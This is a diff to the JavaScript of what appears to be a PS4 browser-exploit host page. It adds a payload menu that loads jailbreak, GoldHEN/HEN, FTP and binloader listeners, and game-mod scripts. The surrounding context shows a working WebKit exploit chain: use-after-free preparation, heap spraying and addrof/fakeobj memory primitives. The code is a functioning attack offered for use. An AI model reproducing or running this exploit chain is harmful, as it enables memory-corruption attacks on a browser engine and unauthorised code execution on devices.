@@ -80,9 +80,118 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("->Exploit Complete..Run Payloads !!");
+	debug_log("->Exploit Complete....!!");
 	if(window.postExploit)
 		window.postExploit();
+}
+function toggle_payload(pld){
+	if(pld == "exploit"){
+		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
+		preloadScripts(['jb.js']);
+	}else if(pld == "goldhen1"){
+		document.getElementById("progress").innerHTML="Loading GoldHenv1.0.. Please wait..";
+		if(fw=="755"){
+			preloadScripts(['preloader.js', 'goldhen1v'+fw+'.js', 'loader.js']);
+	}else{
+			preloadScripts(['preloader'+fw+'.js', 'goldhen1v'+fw+'.js', 'loader.js']);	
+		}
+	}else if(pld == "goldhen"){
+		document.getElementById("progress").innerHTML="Loading GoldHenv1.1.. Please wait..";
+		if(fw=="755"){
+			preloadScripts(['preloader.js', 'goldhen'+fw+'.js', 'loader.js']);
+	}else{
+			preloadScripts(['preloader'+fw+'.js', 'goldhen'+fw+'.js', 'loader.js']);	
+		}
+	}else if(pld == "hen213b"){
+		document.getElementById("progress").innerHTML="Loading Hen v2.1.3b ... Please wait..";
+		preloadScripts(['mira.js', 'hen213b.js', 'loader.js']);
+	}else if(pld == "Toolbox"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'toolbox.js', 'loader.js']);
+	}else if(pld == "backup"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'backup.js', 'loader.js']);
+	}else if(pld == "restore"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'restore.js', 'loader.js']);
+	}else if(pld == "dumper"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'dumper.js', 'loader.js']);
+	}else if(pld == "app2usb"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'app2usb.js', 'loader.js']);
+	}else if(pld == "ftp"){
+		setTimeout(function(){document.getElementById("progress").innerHTML="FTP Loaded.. Access at port 1337.."; }, 7000);
+		preloadScripts(['preloader.js', 'ftp.js', 'loader.js']);
+	}else if(pld == "ps4debug"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'payload.js', 'loader.js', 'frontend.js']);
+	}else if(pld == "todex"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'todex.js', 'loader.js']);
+	}else if(pld == "binloader"){
+		document.getElementById("progress").innerHTML="Awaiting Payload.. Send Payload to port 9021..";
+		preloadScripts(['preloader.js', 'loader.js']);
+	}else if(pld == "idu"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'idu.js', 'loader.js']);
+	}else if(pld == "rifrenamer"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'rifrenamer.js', 'loader.js']);
+	}else if(pld == "linuxl1gb"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'linuxl1gb.js', 'loader.js']);
+	}else if(pld == "linuxl3gb"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'linuxl3gb.js', 'loader.js']);
+	}else if(pld == "kernelclock"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'kernelclock.js', 'loader.js']);
+	}else if(pld == "historyblocker"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'historyblocker.js', 'loader.js']);
+	}else if(pld == "disableupdates"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'disableupdates.js', 'loader.js']);
+	}else if(pld == "enableupdates"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'enableupdates.js', 'loader.js']);
+	}else if(pld == "Webrte"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'webrte.js', 'loader.js']);
+	}else if(pld == "ArabicGuy100"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'gtava1.js', 'loader.js']);
+	}else if(pld == "ArabicGuy127"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'gtava2.js', 'loader.js']);
+	}else if(pld == "ArabicGuy134"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'gtava3.js', 'loader.js']);
+	}else if(pld == "Lamance"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'gtavl.js', 'loader.js']);	
+	}else if(pld == "rd2113"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'oyster113.js', 'loader.js']);
+	}else if(pld == "rd2119"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'oyster119.js', 'loader.js']);
+	}else if(pld == "rd2124"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'oyster124.js', 'loader.js']);
+	}
+	if(window.postPayload)
+		window.postPayload();
+	payload_finished(pld);
+}
+function payload_finished(payload)
+{
+	if(payload == "binloader"){
+		setTimeout(function(){document.getElementById("progress").innerHTML="Awaiting Payload!! Send Payload To Port 9021"; }, 7000);
+	} else if(payload != "exploit" && payload != "exploit_old"){
+		setTimeout(function(){document.getElementById("progress").innerHTML="Payload Loaded Succesfully !!"; }, 7000);
+	}
 }
 function read(addr, length) {
 	for (let i = 0; i < 8; i++)
@@ -208,7 +317,7 @@ function confuseTargetObjRound1() {
 		die("[!] Failed to reuse target obj.");
 	dumpTargetObj();
 	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
-	setTimeout(leakJSC, 6000);
+	setTimeout(function(){leakJSC();}, 6000);
 }
 function handle2() {
 	input2.focus();
@@ -275,7 +384,7 @@ function prepareUAF() {
 	g_input.autofocus = true;
 }
 function sprayHTMLTextArea() {
-	debug_log("Loading ...");
+	debug_log("-> Spraying HTMLTextareaElement ...");
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
@@ -291,9 +400,11 @@ function sprayStringImpl(start, end) {
 	}
 }
 function go() {
+		if(localStorage.is75XCached){
 		sprayHTMLTextArea();
 		if(window.midExploit)
 			window.midExploit();
 		g_input = input1;
 		prepareUAF();
+	}
 }
